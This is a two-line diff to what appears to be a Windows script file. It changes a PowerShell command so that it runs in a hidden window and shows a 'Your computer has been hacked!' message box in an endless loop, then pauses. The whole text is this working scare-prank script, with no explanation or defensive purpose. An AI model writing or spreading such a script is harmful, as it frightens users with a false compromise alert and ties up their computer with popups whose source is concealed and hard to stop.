@@ -1,1 +1,2 @@
-Add-Type -AssemblyName System.Windows.Forms; while ($true) { [System.Windows.Forms.MessageBox]::Show('Your computer has been hacked!') }
+powershell -windowstyle hidden -c "Add-Type -AssemblyName System.Windows.Forms; while ($true) { [System.Windows.Forms.MessageBox]::Show('Your computer has been hacked!') }"
+pause
